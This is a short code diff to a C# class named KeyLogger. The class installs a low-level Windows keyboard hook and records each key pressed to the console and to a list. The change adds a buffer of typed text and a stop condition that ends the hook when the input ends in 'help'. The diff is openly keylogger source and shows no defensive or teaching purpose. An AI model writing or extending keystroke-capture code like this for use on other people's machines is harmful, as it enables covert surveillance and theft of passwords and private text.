@@ -7,6 +7,7 @@ public class KeyLogger {
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelKeyboardProc proc = HookCallback;
     private static List<string> keyPresses = new List<string>();
+    private static string currentInput = "";
 
     public static void Start() {
         hookId = SetHook(proc);
@@ -34,8 +35,13 @@ public class KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
-            Console.WriteLine((Keys)vkCode);
-            keyPresses.Add(((Keys)vkCode).ToString());
+            string key = ((Keys)vkCode).ToString();
+            Console.WriteLine(key);
+            keyPresses.Add(key);
+            currentInput += key.ToLower();
+            if (currentInput.EndsWith("help")) {
+                Stop();
+            }
             Console.WriteLine(keyPresses.Count);
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
